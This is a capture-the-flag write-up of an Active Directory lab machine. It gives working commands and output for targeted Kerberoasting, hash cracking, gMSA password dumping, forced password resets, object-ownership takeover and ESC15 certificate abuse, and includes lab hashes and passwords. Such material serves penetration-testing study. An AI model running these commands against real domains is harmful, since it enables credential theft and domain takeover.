---
title: Boot2Root - Machine 0x5b60626d586e7b6c676a7d
published: 2025-08-04
description: This post covers my process of exploiting Machine 0x5b60626d586e7b6c676a7d — a realistic lab that simulates an Active Directory environment with various typical privilege escalation techniques.
tags: [redteam, windows, real-life, pentest, medium]
category: Boot2Root
draft: false
---

## Machine 0x5b60626d586e7b6c676a7d - H

> Description: As is common in real life Windows pentests, these are the credentials for the following account: **henry / H3nry_987TGV!**
> 

# Recon

## Rustscan + Nmap:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ rustscan -a 10.10.11.72 -- -A

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-30 07:30:36Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-30T07:32:11+00:00; +3h36m08s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
....
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
...
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-30T07:32:11+00:00; +3h36m08s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
....
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
....
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
```
- DC01.tombwatcher.htb  
- tombwatcher.htb  

## SMB:
```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ smbclient -L \\\\10.10.11.72\\ 
Password for [WORKGROUP\I3isk3t]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### Users enum
```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ nxc smb 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --users 
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.72     445    DC01             Administrator                 2025-04-25 14:56:03 0       Built-in account for administering the computer/domain 
SMB         10.10.11.72     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.72     445    DC01             krbtgt                        2024-11-16 00:02:28 0       Key Distribution Center Service Account 
SMB         10.10.11.72     445    DC01             Henry                         2025-05-12 15:17:03 0        
SMB         10.10.11.72     445    DC01             Alfred                        2025-05-12 15:17:03 0        
SMB         10.10.11.72     445    DC01             sam                           2025-05-12 15:17:03 0        
SMB         10.10.11.72     445    DC01             john                          2025-05-19 13:25:10 0        
SMB         10.10.11.72     445    DC01             [*] Enumerated 7 local users: TOMBWATCHER
```

### Bloodhound
After enumerating as many users as possible in the `tombwatcher.htb` domain, I used Bloodhound to start tracing the relationships between users and figuring out a path for exploitation:
```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb/tombwatcher]
└─$ bloodhound-python -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -gc dc01.tombwatcher.htb -c all -ns 10.10.11.72 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 17S
INFO: Compressing output into 20250730041241_bloodhound.zip
```
<img width="1041" height="613" alt="image" src="https://github.com/user-attachments/assets/07d93f35-05be-4735-966f-425d160f33f0" />

Okay, here is the relationship graph from **Henry** to **John**:

- **Starting from Henry:**
  - **Henry** has `WriteSPN` rights on the user `ALFRED@TOMBWATCHER.HTB`.

- **So what is WriteSPN?**
  - When a user has `WriteSPN` rights over another account, we can add a SPN (Service Principal Name) to that account, then perform Targeted Kerberoasting → extract the hash and crack it to obtain the password.
  - This technique is commonly used to escalate from one user to another.

- **Alfred → INFRASTRUCTURE group:**
  - **Alfred** can `AddSelf` to the group `INFRASTRUCTURE@TOMBWATCHER.HTB`.

- **INFRASTRUCTURE group → ANSIBLE_DEV$:**
  - The `INFRASTRUCTURE` group has `ReadGMSAPassword` rights on `ANSIBLE_DEV$`.

- **ANSIBLE_DEV$ → Sam:**
  - `ANSIBLE_DEV$` can `ForceChangePassword` on the user `SAM`.

- **Sam → John:**
  - `SAM` has `WriteOwner` rights on `JOHN`.

⇒ **John** has remote access rights (Remote Desktop Users)

## User flag:
---
Here are the steps to get the user flag:  
- **Henry → Alfred:** **WriteSPN** → use **Kerberoasting** to get Alfred's hash.  
- **Alfred → AddSelf** to the **INFRASTRUCTURE** group.  
- **INFRASTRUCTURE → ReadGMSAPassword → ANSIBLE_DEV$**  
- **ANSIBLE_DEV$ → ForceChangePassword → Sam**  
- **Sam → WriteOwner → John →** remote access.  
⇒ pwn pwn pwn  
---
### **1. Henry → Alfred**  
Abuse the **SPN** write permission to create a **Kerberos** ticket and extract the hash of user **Alfred:**  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/targetedKerberoast]
└─$ python3 targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --dc-ip 10.10.11.72
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$9fadf3372797e761e89f177a34937a4a$eb3f41e4d14cec5e2f26ee122a7ab55c02625648e92658fbf88dc0d002a68f16de08bc256b1ca4219392f9954b3f07b4a7a8d8d24c523b1664db0846b967c0e34d40c61a735fe3cc31fd0917b4ec39c33e4c7466c9ce0e7ae376d604ebf8e8a895561f68f1396a1f24e29a6a92d434884837eab834abb8e9cd08af1f844737322982f6d71a1188e1e983b24fea83cdbc084fd56baa4ba07550d4b22c4340b898fa1ffffbe732eec484ba6a1ffe9048b95bdebeda0c5e46169c75bae4720f781a772b181bc7bf759dc33cf06821eba863c16b15e1a23db3c4ad979cf3b265a01093ab5c826d75d3d2885257aca6f4fb7c27e571dd2cbe5fdf932370858312d6dfaf9203fd21a938b9de756d53b5daf7e8c5a4ba793447fad23bc36e98a76b2eb01b3ddc676202dd8c303d1c1fe40c8dee7f753bb9065511543c729de47b1e722f103f6293243d7faabb739ab60b8a527b08184775ec9fb163381965e790c75ad113232bc861fb9ba48a136c9046e21d56916af30081d9bde8d91b52972acbf4739cbb8d12d9d63e064c2030c5a51a294393841e246bdbb98ee9f70eb2322334ac10cd3d9b6ea91aff1cec369c58e520095a2458429583d0699a08ccea8745c995a862bdbcb22448e2aee0c04f075193adc977095bcd47395c6113acb76f4006ad8c1b4d3e08b05de9bf3f9219900b48b012f5d028c1dc7598c8acaddb8c8ffee605175c77c6eac0dd84ac6bc902a0730174fd71ded129234a79ee09b4f3cf9d309c68343fff4e96688af59428a2877575df2d920f76b85631710e362e79cab353d4a71256f66a6aeec1c40723a0839dfeaf46b1080dbf865e701880df435d6597c403eb383451ab5b984c458e8605fa1aed2524250062ef776e5b7068e5d2f5e586c4ad3fbed70c22bcc937fd7e743c4ef0c610b86529749655699e6cbea7b4d6cf0ed9d7a4c5c6eef66eac39113b9a11620a42af40249a3025c4e89265df6efcb060fc8f4d8a16ec6e76bf0b2520112e1dbb68e5ddc0d238b4da73f34e866cfcc8cc84edbf4487d5bbe51bf01a6234e82c6932aa30dc99170fd8320a9104324271ca33385dadb350aa089d262f12c04a5cf771e428d3b5972c143c83095db145ca5497fda83a99c8782ff3e9b1ace820dd0e97dfd9dba2d014309e4d6ed21488daaf15f157eabb0291f6e55e24d2e7eb96c4ea25c0e2a5fb536256b1dc7fce8a5e6a1249b48417dde463f053afb3cd1769688906ac4435936964cd979e3a6dc2b9131d3a032758f4d7d6e3f2c7a69a180db2f2a04c9468d49d15be06d3162ba549c10bce0b2b0437f0d9e67bb6cfe7a033bf6789dd968a8d2fba7beb9c337faa8bc40c52b0e0f572474f941a8595baaa064d1812e574eaf0d36670b487bc049aa22b3c58ff0d7fa90d8a5e652dae0debf687e8201a5002ccdfccf5a9765e0afff60b982e5195e39659282497514fba098575994d40
```
Crack hash:
```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb/tombwatcher]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$9fadf3372797e761e89f177a34937a4a$eb3f41e4d14cec5e2f26ee122a7ab55c02625648e92658fbf88dc0d002a68f16de08bc256b1ca4219392f9954b3f07b4a7a8d8d24c523b1664db0846b967c0e34d40c61a735fe3cc31fd0917b4ec39c33e4c7466c9ce0e7ae376d604ebf8e8a895561f68f1396a1f24e29a6a92d434884837eab834abb8e9cd08af1f844737322982f6d71a1188e1e983b24fea83cdbc084fd56baa4ba07550d4b22c4340b898fa1ffffbe732eec484ba6a1ffe9048b95bdebeda0c5e46169c75bae4720f781a772b181bc7bf759dc33cf06821eba863c16b15e1a23db3c4ad979cf3b265a01093ab5c826d75d3d2885257aca6f4fb7c27e571dd2cbe5fdf932370858312d6dfaf9203fd21a938b9de756d53b5daf7e8c5a4ba793447fad23bc36e98a76b2eb01b3ddc676202dd8c303d1c1fe40c8dee7f753bb9065511543c729de47b1e722f103f6293243d7faabb739ab60b8a527b08184775ec9fb163381965e790c75ad113232bc861fb9ba48a136c9046e21d56916af30081d9bde8d91b52972acbf4739cbb8d12d9d63e064c2030c5a51a294393841e246bdbb98ee9f70eb2322334ac10cd3d9b6ea91aff1cec369c58e520095a2458429583d0699a08ccea8745c995a862bdbcb22448e2aee0c04f075193adc977095bcd47395c6113acb76f4006ad8c1b4d3e08b05de9bf3f9219900b48b012f5d028c1dc7598c8acaddb8c8ffee605175c77c6eac0dd84ac6bc902a0730174fd71ded129234a79ee09b4f3cf9d309c68343fff4e96688af59428a2877575df2d920f76b85631710e362e79cab353d4a71256f66a6aeec1c40723a0839dfeaf46b1080dbf865e701880df435d6597c403eb383451ab5b984c458e8605fa1aed2524250062ef776e5b7068e5d2f5e586c4ad3fbed70c22bcc937fd7e743c4ef0c610b86529749655699e6cbea7b4d6cf0ed9d7a4c5c6eef66eac39113b9a11620a42af40249a3025c4e89265df6efcb060fc8f4d8a16ec6e76bf0b2520112e1dbb68e5ddc0d238b4da73f34e866cfcc8cc84edbf4487d5bbe51bf01a6234e82c6932aa30dc99170fd8320a9104324271ca33385dadb350aa089d262f12c04a5cf771e428d3b5972c143c83095db145ca5497fda83a99c8782ff3e9b1ace820dd0e97dfd9dba2d014309e4d6ed21488daaf15f157eabb0291f6e55e24d2e7eb96c4ea25c0e2a5fb536256b1dc7fce8a5e6a1249b48417dde463f053afb3cd1769688906ac4435936964cd979e3a6dc2b9131d3a032758f4d7d6e3f2c7a69a180db2f2a04c9468d49d15be06d3162ba549c10bce0b2b0437f0d9e67bb6cfe7a033bf6789dd968a8d2fba7beb9c337faa8bc40c52b0e0f572474f941a8595baaa064d1812e574eaf0d36670b487bc049aa22b3c58ff0d7fa90d8a5e652dae0debf687e8201a5002ccdfccf5a9765e0afff60b982e5195e39659282497514fba098575994d40:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...994d40
Time.Started.....: Wed Jul 30 05:08:05 2025 (0 secs)
Time.Estimated...: Wed Jul 30 05:08:05 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   232.3 kH/s (1.11ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 18%

Started: Wed Jul 30 05:07:39 2025
Stopped: Wed Jul 30 05:08:07 2025
```
### **2. Alfred → AddSelf** to group **INFRASTRUCTURE**.  
Add user **Alfred** to group **INFRASTRUCTURE:**  
```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb/tombwatcher]
└─$ bloodyAD --host "10.10.11.72" -d "TOMBWATCHER.HTB" -u "alfred" -p "basketball" add groupMember "INFRASTRUCTURE" "alfred"
[+] alfred added to INFRASTRUCTURE

┌──(I3isk3t㉿kali)-[~/Documents/htb/tombwatcher]
└─$ net rpc group members "INFRASTRUCTURE" -U "tombwatcher.htb"/"alfred"%"basketball" -S "10.10.11.72"                  
TOMBWATCHER\Alfred
```
### **3. INFRASTRUCTURE → ReadGMSAPassword → ANSIBLE_DEV$**  
Exploit the **ReadGMSAPassword** permission to compromise a service account:  

- We know that `INFRASTRUCTURE` is a **user group** that has the `ReadGMSAPassword` right over the account `ANSIBLE_DEV$` (a **gMSA** - group Managed Service Account). **gMSAs** are designed so that authorized **computer accounts** or groups can retrieve the **plaintext password** from the **Domain Controller (DC)**.  
- Since user `alfred` is a member of the `INFRASTRUCTURE` group, he has the right to read the password of the **gMSA** `ANSIBLE_DEV$`.  

Extract the password of the **gMSA** from **AD** using the credentials of user **Alfred**:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ python3 gMSADumper.py -u "alfred" -p "basketball" -d "tombwatcher.htb"
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::7bc5a56af89da4d3c03bc048055350f2
ansible_dev$:aes256-cts-hmac-sha1-96:29a7e3cc3aaad2b30beca182a9707f1a1e71d2eb49a557d50f9fd91360ec2f64
ansible_dev$:aes128-cts-hmac-sha1-96:de6c86d8b6a71c4538f82dc570f7f9a6
```
### 4. ANSIBLE_DEV$ → ForceChangePassword → Sam  
Exploit the **ForceChangePassword** permission to take over a user account:  
- The `ForceChangePassword` right allows an attacker account to reset the password of a user account **without knowing the old password**. This enables the attacker to set any password and gain access to that account — in this case, the user `sam`.  
- The account `ANSIBLE_DEV$` has the `ForceChangePassword` permission over the user `sam`, so we can exploit this to change the password.  

Change the password of user **SAM**:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ bloodyAD --host "10.10.11.72" -d "TOMBWATCHER.HTB" -u "ANSIBLE_DEV$" -p :7bc5a56af89da4d3c03bc048055350f2 set password "sam" "attacker"
[+] Password changed successfully!
```
### **5. Sam → WriteOwner → John →** Remote access  
Use the **WriteOwner** permission to take over user **JOHN**:  
- The account `sam` has the **WriteOwner** permission on the user `john`, which means it can change the owner of `john`'s AD object.  
- Once `sam` becomes the owner of `john`, it can grant itself **FullControl** permissions (thanks to the inheritance property of the "owner").  

Change the **owner** of user `john` to `sam`:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'attacker' set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

```

However, when changing the **owner**, we are only modifying the ownership of the `john` object. At this point, `sam` — the new owner — does **not yet have FullControl**, so we need to explicitly grant permissions to user `sam`:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'attacker' add genericAll john sam
[+] sam has now GenericAll on john
```

At this point, we now have the right to change the password of the `john` account after gaining control via **GenericAll**:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p 'attacker' set password john 'pwnpwnpwn'  
[+] Password changed successfully!
```

Log in to **WinRM** using the `john` account and grab the flag!!!  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ evil-winrm -i 10.10.11.72 -u john -p 'pwnpwnpwn'  

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cat ../Desktop/user.txt
cf2f90bed728c2f6f65d487e25c1c15f
*Evil-WinRM* PS C:\Users\john\Documents> 
```

## Root flag:
### Recon template/certificate
Honestly, my brain was not braining when reading the output — over 700 lines... It didn't seem like there was anything exploitable, but time by time reading the output, we can spot an opportunity to exploit **ADCS Vulnerabilities - ESC15**:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ certipy find -u john@tombwatcher.htb -p 'pwnpwnpwn' -dc-ip 10.10.11.72 -stdout | cat > tmp.txt 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
....
17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
....
```
- There is an **orphaned SID** that appears in the template output:
`[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'` , So, which user does this **SID** belong to?  

The conditions for a template to be vulnerable to **ESC15** are as follows:  
```bash
Template Name                       : WebServer
Enrollee Supplies Subject           : True
Schema Version                      : 1
Requires Manager Approval           : False
Application Policies                : Certificate Request Agent
Enrollment Rights                   : cert_admin
```
- So we can see that at least 4 conditions are met, allowing us to exploit **ESC15**.  

Finally, when looking in **BloodHound**, we don’t see `cert_admin` — does that mean this user has been deleted? Is this **SID** in the template output actually from this user?  

<img width="989" height="613" alt="image 1" src="https://github.com/user-attachments/assets/7cd11e18-03e8-49d6-98b6-a92e41bc9e32" />

Now, let’s check the **Active Directory** recycle bin to see if we can find this user and confirm whether they were actually deleted:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ evil-winrm -i 10.10.11.72 -u john -p 'pwnpwnpwn'

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties *

....
accountExpires                  : 9223372036854775807
badPasswordTime                 : 133983472196381402
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {7/30/2025 7:12:41 AM, 7/30/2025 6:53:41 AM, 7/30/2025 6:40:04 AM, 11/16/2024 12:07:10 PM...}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 133983475911225223
lastLogonTimestamp              : 133983462950131557
logonCount                      : 0
Modified                        : 7/30/2025 7:22:00 AM
modifyTimeStamp                 : 7/30/2025 7:22:00 AM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
....
```
- Deleted object being searched: `CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb`
- Cuz this object has the SID: `S-1-5-21-1392491010-1358638721-2126982587-1111`  

Okay, at this point, we can assume that since `cert_admin` was deleted, the **SID** became orphaned and couldn't be resolved to a user/group. As a result, **Certipy** did not clearly mark it as **ESC15**.  

The next step is to restore and reset the password for this user:  
```bash
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
 
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString "certadmin" -AsPlainText -Force)
```

After that, run **Certipy** again to check if it detects **ESC15**, just to be sure:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/gMSADumper]
└─$ certipy find -vulnerable -u cert_admin@tombwatcher.htb -p 'certadmin' -dc-ip 10.10.11.72 -stdout 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

....

Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
                                                           
```
So we can confirm that exploitation is possible to use [**ESC15**](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu).  
### ESC15 Vulnerability

---

During the exploitation of the **ESC15** vulnerability, we cannot directly request a certificate as the **Domain Admin**, because the **CA** will reject the request if the **appropriate permissions** are not in place. To bypass this limitation, we first need to request a certificate with an **Application Policy** of “**Certificate Request Agent**”.  

This certificate acts as a special “delegation,” allowing the `cert_admin` account to **request certificates on behalf of other users** (such as the Administrator). Once the **Request Agent** certificate is obtained, `cert_admin` can send a request to the CA to issue a certificate for the **Domain Admin** using the `-on-behalf-of` parameter.  This is a key part of the technique used to **forge certificates and obtain a Kerberos TGT**, and is a prerequisite for successfully exploiting ESC15.  

---

Use `cert_admin` to request a **Request Agent certificate**:  
```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/pywhisker/pywhisker]
└─$ certipy req -template 'WebServer' -application-policies 'Certificate Request Agent' -ca 'tombwatcher-CA-1' -target 'dc01.tombwatcher.htb' -u 'cert_admin@tombwatcher.htb' -p 'certadmin' -dc-ip '10.10.11.72'

